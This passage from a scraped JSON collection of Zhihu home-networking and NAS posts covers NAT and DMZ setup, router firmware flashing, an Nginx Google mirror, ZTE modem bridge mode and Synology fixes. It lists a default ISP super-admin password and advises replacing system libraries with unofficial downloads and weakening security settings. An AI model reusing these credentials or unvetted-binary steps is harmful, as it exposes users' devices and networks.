了。</p><p>如果不一致，那么只能联系运营商，自己是没有办法的。一般来说一级运营商（电信/联通）比较容易，而一些二级甚至三级运营商（长城）就没什么希望了。如果拿不到公网 IP，只能期望运营商不要把 NAT 类型限制太死吧。</p><h3><b>光猫改为桥接模式</b></h3><h3><b>区分桥接与路由模式</b></h3><p>现在原来越多的猫“越权管理”，增加了路由功能，也就是说猫和路由器一体化了。每一个路由器可以理解为一层网络，我们不希望层数过多。同时猫的路由功能往往不完善，难以进行高级配置。而桥接模式就是让猫回归本质，只负责信号转换。</p><p>区分路由与桥接模式最方便的办法是：如果你的路由器（电脑）直接连到猫上就可以上网，那么是路由模式；如果路由器需要配置 PPPoE 拨号那么就是桥接模式。</p><h3><b>更改模式</b></h3><p>一般来说更改模式需要猫的超级密码，这个用户是没有的。请联系运营商客服请求修改。改为桥接后②也不会发生 NAT 了。</p><p><b>警告</b>：没能力折腾的不建议自己破解改。更改桥接模式之后记得重新配置路由器，输入宽带账号密码才可以正常上网。</p><h3><b>更改路由器设置</b></h3><p>首先要修改 NAT 类型，并不是所有的路由器或者路由器系统都支持这一设置。打开 NAT 并将类型设置为最宽松的 NAT1（Full cone NAT）。</p><p>接着启用 UPnP，绝大部分路由器都支持的，耐心找一找。如果真的不支持那我建议换路由器。</p><p>如果不支持上述的 NAT 类型设置，我们还有一个大招。大部分的路由器都支持 DMZ （非军事化区），DMZ 指定的设备完全暴露在公网上。但是一个网络一般只能够设置1个 DMZ，显然如果设置多个路由器就不知道应该把数据包交给谁了。由于 DMZ 是和 IP 绑定的，而 IP 是动态分配的。所有首先我们将 IP 与 MAC 绑定（不同的路由器设置不同），然后将此 IP 设置为 DMZ 即可。</p><h3><b>更改系统设置</b></h3><p>最后如果你的系统启用了防火墙那么记得将需要的程序添加例外，或者关闭防火墙（不推荐）。最后进行测试，NAT 类型应该可以提升到完全圆锥型NAT（Full cone NAT）。</p><h2><b>无线中继和桥接</b></h2><p>以 hiboy 的老毛子 Padavan 系统路由器为例，介绍一下无线中继和桥接的异同：</p><ul><li>无线中继：选择 AP + AP Client，接 LAN 就要关闭本路由 DHCP，上级路由开启 DHCP，本路由的 IP 不能和上级一样，但要在一个网段里。例子：一个是 192.168.1.1，另一个是 192.168.1.2。</li><li>无线桥接：选择 AP + AP Client，接 WAN 就要开启本路由 DHCP，上级路由开启 DHCP，本路由的 IP 不能和上级同网段。例子：一个是 192.168.1.1，另一个是 192.168.2.1。</li></ul><h2><b>参考</b></h2><ol><li><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">维基百科，自由的百科全书</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.chenhe.cc/p/41\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">NAT 科普与类型提升 – 晨鹤小站(｡･∀･)ﾉﾞ</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//right.com.cn/forum/thread-182967-1-1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">老毛子Padavan固件 无线中继实践心得分享 - Padavan - 恩山无线论坛 - Powered by Discuz!</a></li><li><a href=\"https://www.zhihu.com/question/20380724\" class=\"internal\">无线网络的中继和桥接有什么区别？ - 知乎</a></li><li><a href=\"https://www.zhihu.com/question/31332694\" class=\"internal\">NAT转换是怎么工作的？</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//time.geekbang.org/column/intro/85\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">极客时间-趣谈网络协议</a></li></ol>", 
            "topic": [
                {
                    "tag": "NAT网络地址转换协议", 
                    "tagLink": "https://api.zhihu.com/topics/19628342"
                }, 
                {
                    "tag": "路由器", 
                    "tagLink": "https://api.zhihu.com/topics/19561099"
                }, 
                {
                    "tag": "网络协议", 
                    "tagLink": "https://api.zhihu.com/topics/19779985"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/84280102", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 1, 
            "title": "修复黑群晖 Moments 1.3.x 版本人物识别不能使用问题", 
            "content": "<blockquote>本文首发于: <a href=\"https://link.zhihu.com/?target=https%3A//woodenrobot.me/2019/09/26/fix-moments/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">修复黑群晖 Moments 1.3.x 版本人物识别不能使用问题</a></blockquote><p>1.  下载 <a href=\"https://link.zhihu.com/?target=https%3A//github.com/Wooden-Robot/documents-for-fun/raw/master/%25E7%25BE%25A4%25E6%2599%2596%2520Synology%2520DSM/libsynophoto-plugin-detection.so\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">libsynophoto-plugin-detection.so</a> 文件</p><p>2.  SSH 登录群晖，并登录 root 账号</p><p>3. 备份原文件</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ mv /var/packages/SynologyMoments/target/usr/lib/libsynophoto-plugin-detection.so /var/packages/SynologyMoments/target/usr/lib/libsynophoto-plugin-detection.so.bak</code></pre></div><p>4.  将刚刚下载的文件放到 <code>/var/packages/SynologyMoments/target/usr/lib/</code>路径下</p><p>5. 重启 Moments 并重新创建索引。</p><p><b><i>注： 修复 bug 的</i></b> <b><i><code>libsynophoto-plugin-detection.so</code></i></b> <b><i>文件来源于 1.2.1-0646 版本的 Moments</i></b></p><h2><b>参考</b></h2><ol><li><a href=\"https://link.zhihu.com/?target=https%3A//xpenology.com/forum/topic/20105-fix-the-problem-of-moments-13x-face-recognition-not-work/%3Ftab%3Dcomments%23comment-118808\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Fix the problem of moments 1.3.x face recognition NOT work - Synology Packages - XPEnology Community</a></li></ol>", 
            "topic": [
                {
                    "tag": "家用 NAS", 
                    "tagLink": "https://api.zhihu.com/topics/19736752"
                }, 
                {
                    "tag": "群晖", 
                    "tagLink": "https://api.zhihu.com/topics/19827077"
                }, 
                {
                    "tag": "黑群晖", 
                    "tagLink": "https://api.zhihu.com/topics/20889789"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/82893117", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 0, 
            "title": "TOTOLINK A3004NS 国行刷入 Breed 不死和 hiboy Padavan 固件", 
            "content": "<blockquote>本文首发于：<a href=\"https://link.zhihu.com/?target=https%3A//woodenrobot.me/2019/09/17/A3004NS/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">TOTOLINK A3004NS 国行刷入 Breed 不死和 hiboy Padavan 固件</a></blockquote><h2><b>前言</b></h2><p>蜗牛星际装了黑群晖后，加上家里的宽带是 200M 带宽，以前的 Newifi mini 百兆路由器已经不能满足需求了，于是闲鱼入手了 TOTOLINK A3004NS 千兆路由器。</p><h2><b>安装 breed</b></h2><p><b>1</b>.进路由记录下LAN, WAN, 2.G, 5G 的 MAC 地址备用；</p><p><b>2</b>.原厂固件下刷入荒野无灯大神 <a href=\"https://link.zhihu.com/?target=https%3A//github.com/Wooden-Robot/documents-for-fun/raw/master/A3004NS/STOCK_ROM_UPGRADE_A3004NS_3.4.3.9-099_20170307-0247.trx\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">A3004NS Padavan 直刷固件</a></p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-9d3a1f675f151b542aca255de261d985_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"558\" data-rawheight=\"375\" class=\"origin_image zh-lightbox-thumb\" width=\"558\" data-original=\"https://pic2.zhimg.com/v2-9d3a1f675f151b542aca255de261d985_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;558&#39; height=&#39;375&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"558\" data-rawheight=\"375\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"558\" data-original=\"https://pic2.zhimg.com/v2-9d3a1f675f151b542aca255de261d985_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-9d3a1f675f151b542aca255de261d985_b.jpg\"/></figure><p><br/>路由器地址为：<a href=\"file:///Applications/Boostnote.app/Contents/Resources/app/lib/192.168.88.1\">192.168.88.1</a><br/>登录账号密码为：<code>admin/admin</code></p><p><b>3</b>.查看固件分区</p><div class=\"highlight\"><pre><code class=\"language-bash\"><span class=\"o\">[</span>A3004NS /opt/home/admin<span class=\"o\">]</span><span class=\"c1\"># cat /proc/mtd</span>\ndev:    size   erasesize  name\nmtd0: <span class=\"m\">00020000</span> <span class=\"m\">00010000</span> <span class=\"s2\">&#34;Bootloader&#34;</span>\nmtd1: <span class=\"m\">00010000</span> <span class=\"m\">00010000</span> <span class=\"s2\">&#34;Config&#34;</span>\nmtd2: <span class=\"m\">00010000</span> <span class=\"m\">00010000</span> <span class=\"s2\">&#34;Factory&#34;</span>\nmtd3: <span class=\"m\">00143250</span> <span class=\"m\">00010000</span> <span class=\"s2\">&#34;Kernel&#34;</span>\nmtd4: 00d7cdb0 <span class=\"m\">00010000</span> <span class=\"s2\">&#34;RootFS&#34;</span>\nmtd5: <span class=\"m\">00100000</span> <span class=\"m\">00010000</span> <span class=\"s2\">&#34;Storage&#34;</span>\nmtd6: 00ec0000 <span class=\"m\">00010000</span> <span class=\"s2\">&#34;Firmware_Stub</span></code></pre></div><p><b>4</b>.重启，备份EEPROM<br/>ssh 登录路由器，使用以下命令进行备份：</p><div class=\"highlight\"><pre><code class=\"language-text\">$ dd if=/dev/mtd2 of=/tmp/Factory.bin</code></pre></div><p><code>Factory</code> 就是 EEPROM。<br/>此时可以将其他分区用同样的方法都备份一下，以备不时之需。备份好需要从路由器中将备份数据下载到本地，可以用 <code>ftp、scp</code>等命令行命令，也可以使用 <code>FileZilla</code> 工具。<br/>这是我用 <code>dd</code> 命令备份的所有分区信息：<a href=\"https://link.zhihu.com/?target=https%3A//github.com/Wooden-Robot/documents-for-fun/tree/master/A3004NS/dd%25E5%25A4%2587%25E4%25BB%25BD\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">dd 全分区备份</a>。</p><p><b>5</b>.下载最新版的 [A3004NS breed 固件]<a href=\"https://link.zhihu.com/?target=https%3A//breed.hackpascal.net/breed-mt7621-totolink-a3004ns.bin%25E5%25B9%25B6%25E4%25B8%258A%25E4%25BC%25A0%25E5%2588%25B0%25E8%25B7%25AF%25E7%2594%25B1%25E5%2599%25A8%25E7%259A%2584\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">https://breed.hackpascal.net/breed-mt7621-totolink-a3004ns.bin并上传到路由器的</a> <code>/tmp</code>路径下。</p><p><b>6</b>.通过 ssh 登录路由器执行：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ mtd_write write /tmp/breed-mt7621-totolink-a3004ns.bin Bootloader</code></pre></div><p><b>7</b>.完了将路由器断电。然后按住前面板上的 <code>WPS</code> 按钮通电，多按一会儿。这时路由器网关又变成了 <a href=\"file:///Applications/Boostnote.app/Contents/Resources/app/lib/192.168.1.1\">192.168.1.1</a>。使用浏览器打开这个地址就可以进入 breed 后台。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-60a3fec2ce72c4fde8cb642bb96c6cac_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"747\" data-rawheight=\"267\" class=\"origin_image zh-lightbox-thumb\" width=\"747\" data-original=\"https://pic1.zhimg.com/v2-60a3fec2ce72c4fde8cb642bb96c6cac_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;747&#39; height=&#39;267&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"747\" data-rawheight=\"267\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"747\" data-original=\"https://pic1.zhimg.com/v2-60a3fec2ce72c4fde8cb642bb96c6cac_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-60a3fec2ce72c4fde8cb642bb96c6cac_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p><b>8</b>.进入 <code>Breed</code> 后，记得先备份 <code>EEPROM</code>。这个很重要，后面如果刷固件刷出问题需要这个来还原。</p><figure data-size=\"normal\"><noscript><img src=\"https://pic3.zhimg.com/v2-8f07b59cad019347aa4c6ed30f8b37e2_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"589\" data-rawheight=\"202\" class=\"origin_image zh-lightbox-thumb\" width=\"589\" data-original=\"https://pic3.zhimg.com/v2-8f07b59cad019347aa4c6ed30f8b37e2_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;589&#39; height=&#39;202&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"589\" data-rawheight=\"202\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"589\" data-original=\"https://pic3.zhimg.com/v2-8f07b59cad019347aa4c6ed30f8b37e2_r.jpg\" data-actualsrc=\"https://pic3.zhimg.com/v2-8f07b59cad019347aa4c6ed30f8b37e2_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2><b>安装 hiboy Padavan</b></h2><p><b>1</b>.下载 hiboy Padavan 最新版固件：[<a href=\"https://link.zhihu.com/?target=http%3A//opt.cn2qq.com/padavan/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">index - powered by h5ai v0.29.2 (https://larsjung.de/h5ai/)</a>](<a href=\"https://link.zhihu.com/?target=http%3A//opt.cn2qq.com/padavan/\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">opt.cn2qq.com/padavan/</span><span class=\"invisible\"></span></a>)</p><p><b>2</b>.进入 Breed，点击“固件更新”-〉“常规固件”：</p><ul><li>勾选<code>固件</code>，并选择我们下载的固件。</li><li>勾选<code>EEPROM</code>，并选择刚刚用 <code>Breed</code>备份的 <code>EEPROM</code></li><li>闪存布局选择：<code>公版(0x50000)</code></li><li>点击<code>上传</code>按钮进行安装。</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-3d54f24ab246f0fa1953b5d7b417a5e7_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"584\" data-rawheight=\"318\" class=\"origin_image zh-lightbox-thumb\" width=\"584\" data-original=\"https://pic4.zhimg.com/v2-3d54f24ab246f0fa1953b5d7b417a5e7_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;584&#39; height=&#39;318&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"584\" data-rawheight=\"318\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"584\" data-original=\"https://pic4.zhimg.com/v2-3d54f24ab246f0fa1953b5d7b417a5e7_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-3d54f24ab246f0fa1953b5d7b417a5e7_b.jpg\"/></figure><p><br/>路由器地址为：<a href=\"file:///Applications/Boostnote.app/Contents/Resources/app/lib/192.168.123.1\">192.168.123.1</a><br/>登录账号密码为：<code>admin/admin</code></p><p><b>3</b>.如果MAC地址改变，<a href=\"https://link.zhihu.com/?target=https%3A//www.right.com.cn/forum/thread-321228-1-1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">进入 Breed 把记下来的 MAC 地址填进去并保存</a>。</p><h2><b>参考</b></h2><ol><li><a href=\"file:///Applications/Boostnote.app/Contents/Resources/app/lib/right.com.cn/forum/forum.php?mod=viewthread&amp;tid=321428&amp;page=1\">国行A3004NS-Dual刷机实战（附编程器固件）</a></li><li><a href=\"file:///Applications/Boostnote.app/Contents/Resources/app/lib/hangge.com/blog/cache/detail_1857.html\">Padavan老毛子固件刷机教程（TOTOLINK A3004NS 路由器）</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//www.right.com.cn/forum/thread-321228-1-1.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">极路由4(B70)刷Padavan固件后在breed里修复MAC的方法</a></li></ol>", 
            "topic": [
                {
                    "tag": "路由器", 
                    "tagLink": "https://api.zhihu.com/topics/19561099"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/79825610", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 5, 
            "title": "Nginx 搭建 Google 镜像站", 
            "content": "<blockquote>本文首发于：<a href=\"https://link.zhihu.com/?target=https%3A//woodenrobot.me/2019/08/26/google/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Nginx 搭建 Google 镜像站</a></blockquote><h2>前言</h2><p>在公司科学上网使用谷歌经常出现很长一段时间访问不了，严重影响工作效率，没办法只能自己搭建一个镜像网站。</p><h2>正文</h2><h2>环境</h2><ul><li>机房：搬瓦工</li><li>系统：Ubuntu 18.04</li></ul><h2>安装 nginx</h2><div class=\"highlight\"><pre><code class=\"language-bash\">$ sudo apt install nginx</code></pre></div><h2>增加 nginx 配置</h2><p>在 <code>/etc/nginx/sites-enabled</code> 文件夹内新增 <code>google.conf</code> 配置文件，配置文件内容为：</p><div class=\"highlight\"><pre><code class=\"language-nginx\"><span class=\"k\">server</span> <span class=\"p\">{</span>\n    <span class=\"kn\">server_name</span> <span class=\"s\">www.example.com</span><span class=\"p\">;</span>\n \n    <span class=\"kn\">location</span> <span class=\"s\">/</span> <span class=\"p\">{</span>\n        <span class=\"kn\">proxy_pass</span> <span class=\"s\">https://www.google.com/</span><span class=\"p\">;</span>\n \n        <span class=\"kn\">proxy_redirect</span> <span class=\"s\">https://www.google.com/</span> <span class=\"s\">/</span><span class=\"p\">;</span>\n        <span class=\"kn\">proxy_cookie_domain</span> <span class=\"s\">google.com</span> <span class=\"s\">www.example.com</span><span class=\"p\">;</span>\n \n        <span class=\"kn\">proxy_set_header</span> <span class=\"s\">User-Agent</span> <span class=\"nv\">$http_user_agent</span><span class=\"p\">;</span>\n        <span class=\"kn\">proxy_set_header</span> <span class=\"s\">Cookie</span> <span class=\"s\">&#34;PREF=ID=047808f19f6de346:U=0f62f33dd8549d11:FF=2:LD=zh-CN:NW=1:TM=1325338577:LM=1332142444:GM=1:SG=2:S=rE0SyJh2W1IQ-Maw&#34;</span><span class=\"p\">;</span>\n        <span class=\"c1\"># 这里设置cookie，这里是别人给出的一段，必要时请放上适合你自己的cookie\n</span><span class=\"c1\"></span>        <span class=\"c1\"># 设置这个可以避免一些情况下的302跳转，如果google服务器返回302 redirect，那么浏览器被跳转到google自己的域名，那就没的玩了\n</span><span class=\"c1\"></span> \n        <span class=\"kn\">proxy_set_header</span> <span class=\"s\">X-Real-IP</span> <span class=\"nv\">$remote_addr</span><span class=\"p\">;</span>\n        <span class=\"kn\">proxy_set_header</span> <span class=\"s\">X-Forwarded-For</span> <span class=\"nv\">$proxy_add_x_forwarded_for</span><span class=\"p\">;</span>\n \n        <span class=\"kn\">subs_filter</span>  <span class=\"s\">http://www.google.com</span> <span class=\"s\">http://www.example.com</span><span class=\"p\">;</span>\n        <span class=\"kn\">subs_filter</span>  <span class=\"s\">https://www.google.com</span> <span class=\"s\">http://www.example.com</span><span class=\"p\">;</span>\n        <span class=\"c1\"># 这里替换网页中的链接，因为我们的镜像站是http的，所以上面顺便把协议也一起替换了\n</span><span class=\"c1\"></span> <span class=\"p\">}</span>\n<span class=\"p\">}</span></code></pre></div><p><b><i>注：请手动更改配置中的</i></b> <b><i><a href=\"https://link.zhihu.com/?target=http%3A//www.example.com/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">www.example.com</a></i></b> <b><i>为自己的域名地址</i></b></p><h2>载入配置</h2><p>使用下列命令重新载入配置</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ nginx -s reload</code></pre></div><h2>添加 DNS 解析记录</h2><p>将自己的域名添加一条指向该台服务器 IP 的 DNS 解析记录，访问域名即可实现访问谷歌。</p><h2>增加 Basic Auth 认证</h2><p>如果不想自己的谷歌镜像被别人乱用，可以增加 Basic Auth 来限制其他人使用。</p><h3>生成密码</h3><p>使用下列命令生成密码：</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ <span class=\"nb\">printf</span> <span class=\"s2\">&#34;your_username:</span><span class=\"k\">$(</span>openssl passwd -crypt your_password<span class=\"k\">)</span><span class=\"s2\">\\n&#34;</span> &gt;&gt; /etc/nginx/conf.d/passwd</code></pre></div><h3>配置 Nginx</h3><p>用 vim 修改刚刚的配置文件</p><div class=\"highlight\"><pre><code class=\"language-bash\">$ vim /etc/nginx/sites-enabled/google.conf</code></pre></div><p>增加下列内容</p><div class=\"highlight\"><pre><code class=\"language-nginx\"><span class=\"k\">...</span>\n\n<span class=\"s\">location</span> <span class=\"s\">/</span> <span class=\"p\">{</span>\n        <span class=\"kn\">auth_basic</span> <span class=\"s\">&#34;Hello</span> <span class=\"s\">World&#34;</span><span class=\"p\">;</span>\n        <span class=\"kn\">auth_basic_user_file</span> <span class=\"s\">conf.d/passwd</span><span class=\"p\">;</span>\n\n        <span class=\"kn\">proxy_pass</span> <span class=\"s\">https://www.google.com/</span><span class=\"p\">;</span>\n<span class=\"kn\">...</span></code></pre></div><p>然后 <code>nginx -s reload</code> 重启 Nginx 生效。</p><h2>参考</h2><ol><li><a href=\"https://link.zhihu.com/?target=https%3A//blog.stdio.io/689\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">Nginx 搭建 Google 镜像站</a></li><li><a href=\"https://link.zhihu.com/?target=https%3A//segmentfault.com/a/1190000004694935\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">为 Nginx 添加 HTTP 基本认证(HTTP Basic Authentication)</a></li></ol>", 
            "topic": [
                {
                    "tag": "谷歌 (Google)", 
                    "tagLink": "https://api.zhihu.com/topics/19565870"
                }, 
                {
                    "tag": "镜像", 
                    "tagLink": "https://api.zhihu.com/topics/19613178"
                }
            ], 
            "comments": [
                {
                    "userName": "耗儿", 
                    "userLink": "https://www.zhihu.com/people/8827da593b79455da3e0bf6438204b05", 
                    "content": "<p>\"需要网站所有者处理的错误：<br>网站密钥的网域无效\"</p><p>答主能解答一下么。配置完成之后打开 显示的是谷歌的界面但是搜索内容后会跳转到这个页面</p>", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "<p>没有遇到这个情况，你可以看看这个 <a href=\"http://link.zhihu.com/?target=https%3A//github.com/aploium/zmirror/issues/67\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">https://</span><span class=\"visible\">github.com/aploium/zmir</span><span class=\"invisible\">ror/issues/67</span><span class=\"ellipsis\"></span></a></p>", 
                            "likes": 0, 
                            "replyToAuthor": "耗儿"
                        }
                    ]
                }, 
                {
                    "userName": "xindubawukong", 
                    "userLink": "https://www.zhihu.com/people/d38404b9ec6af3a01c9332852d5f3df8", 
                    "content": "为什么不直接搭vpn呢", 
                    "likes": 0, 
                    "childComments": [
                        {
                            "userName": "WoodenRobot", 
                            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
                            "content": "前言里说了的", 
                            "likes": 0, 
                            "replyToAuthor": "xindubawukong"
                        }
                    ]
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/79821120", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 0, 
            "title": "中兴 ZXHN F677V2 光猫改桥接", 
            "content": "<blockquote>本文首发于：<a href=\"https://link.zhihu.com/?target=https%3A//woodenrobot.me/2019/08/26/bridge/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">中兴 ZXHN F677V2 光猫改桥接</a></blockquote><h2>前言</h2><p>家里用蜗牛星际组装了一个黑群晖，之前用 Zerotier-one 做内网穿透从外网连接到群晖，后来发现 Zertier-one 的 <code>P2P</code> 的成功率很低，速度很慢，看了一下光猫发现宽带有公网 IP，于是更换光猫为桥接模式，使用路由器拨号上网，路由器做端口转发，直接通过公网 IP 连接群晖，在此记录一下 中兴 ZXHN F677V2 光猫改桥接的方法。Ps: 淘宝要几十块，因为穷就自己动手啦 : )</p><h2>教程</h2><ol><li>连接路由器的网络，访问 <a href=\"https://link.zhihu.com/?target=http%3A//192.168.1.1/cu.html\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">192.168.1.1/cu.html</a>；</li><li>输入超级管理员密码进入超级管理员后台，密码默认为：<code>CUAdmin</code>(Ps: 我是打装宽带的师傅电话要的，不对的话可以问师傅要);</li><li>在基本配置中选择上行线路配置，记录名为 <code>x_INTERNET_R_VID_y</code> 原本 <code>PPPoE</code> 模式中的配置信息，特别是 <code>VLAN ID</code> 值（Ps: x和y的值每个人可能不一样）</li><li>添加一个新的 <code>Bridge</code> 模式的连接，除了模式之前其他的配置设置为和之前 <code>PPPoE</code> 模式相同，切记 <code>VLAN ID</code>值一定要相同；</li><li>删除原来的两个连接，一个是 <code>x_TR069_R_VID_y</code>，一个是 <code>x_INTERNET_R_VID_y</code>。</li><li>路由器使用原本的宽带账号密码拨号上网即可；</li><li>如果拨号后连接不成功，可以关闭光猫几分钟再开启进行尝试。</li></ol><h2>参考</h2><ol><li><a href=\"https://link.zhihu.com/?target=https%3A//www.v2ex.com/t/583187\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">[求助] 联通光猫 ZXHN F477V2 桥接问题</a></li></ol>", 
            "topic": [
                {
                    "tag": "无线桥接", 
                    "tagLink": "https://api.zhihu.com/topics/19851881"
                }
            ], 
            "comments": []
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/77694568", 
            "userName": "WoodenRobot", 
            "userLink": "https://www.zhihu.com/people/bc82447084392dd4fa102b768fabe4c5", 
            "upvote": 3, 
            "title": "群晖 Video Station 支持 DTS 和 eac3 解决方案", 
            "content": "<blockquote>本文首发于：<a href=\"https://link.zhihu.com/?target=https%3A//woodenrobot.me/2019/08/12/syn-vediostation/\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">群晖 Video Station 支持 DTS 和 eac3 解决方案</a></blockquote><h2>前言</h2><p>蜗牛星际装了黑群晖，下了几部蓝光电影，播放的时候确显示“不支持当前所选音频的文件格式，因此无法播放视频。请尝试其它音轨，确定其是否支持”。经过查询得知这两个音轨是需要授权使用的，群晖应该没有给授权费，所以在后续的 Video Station 版本中禁用了这些音轨。</p><h2>解决方案</h2><h2>Video Station 降级</h2><ol><li>首先在套件中心卸载最新版的 <code>Video Station</code>;</li><li>然后下载 <code><a href=\"https://link.zhihu.com/?target=https%3A//global.download.synology.com/download/Package/spk/VideoStation/2.3.4-1468/VideoStation-x86_64-2.3.4-1468.spk\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">video station 2.3.4-1468</a></code> 版本手动安装；</li><li>安装后保持当前版本不要升级。</li></ol><h2>添加第三方套件中心</h2><ol><li>（管理员账号）进入 DSM 桌面，打开<code>套件中心</code>，点击<code>设置</code> ---&gt; <code>常规</code>，在<code>信任层级</code>中选择<code>任何发行者</code>;</li><li>接着点击 <code>套件来源</code>，选择 <code>新增</code> 添加第三方源 <a href=\"https://link.zhihu.com/?target=http%3A//packages.synocommunity.com/\" class=\" external\" target=\"_blank\" rel=\"nofollow noreferrer\"><span class=\"invisible\">http://</span><span class=\"visible\">packages.synocommunity.com</span><span class=\"invisible\">/</span><span class=\"ellipsis\"></span></a></li></ol><h2>安装 ffmpeg</h2><p>在刚刚添加的第三方套件源中找到 <code>ffmpeg</code> 进行安装。</p><p>安装后打开 <code>Video Station</code> 就可以播放 <code>DTS</code> 和 <code>eac3</code> 音轨的视频了。</p><h2>参考</h2><a href=\"https://www.zhihu.com/question/271946974\" data-draft-node=\"block\" data-draft-type=\"link-card\" class=\"internal\">群晖如何支持eac3？</a><p></p>", 
            "topic": [
                {
                    "tag": "群晖", 
                    "tagLink": "https://api.zhihu.com/topics/19827077"
                }
            ], 
            "comments": [
                {
                    "userName": "知乎用户", 
                    "userLink": "https://www.zhihu.com/people/0", 
                    "content": "<p>点赞点赞！！！！完美解决问题：群晖video station 升级后无法播放DTS音轨视频的问题</p>", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "王盛华", 
                    "userLink": "https://www.zhihu.com/people/fd6f9bd4571a5782a6a8bfe46bb78e89", 
                    "content": "想请问下vs不能自动检索到tr或者qb下载的文件，要手动移动一下文件才能检索到，请问有没有自动检索的办法？还有自带的削刮器经常搜不出东西，有改进办法吗？", 
                    "likes": 0, 
                    "childComments": []
                }, 
                {
                    "userName": "ke wang", 
                    "userLink": "https://www.zhihu.com/people/d97b10e7fe41a4faf7dba0a38ae5b533", 
                    "content": "厉害，实测有用，解决了困扰的大问题！", 
                    "likes": 0, 
                    "childComments": []
                }
            ]
        }, 
        {
            "url": "https://zhuanlan.zhihu.com/p/74193910", 
            "userName": "WoodenRobot", 
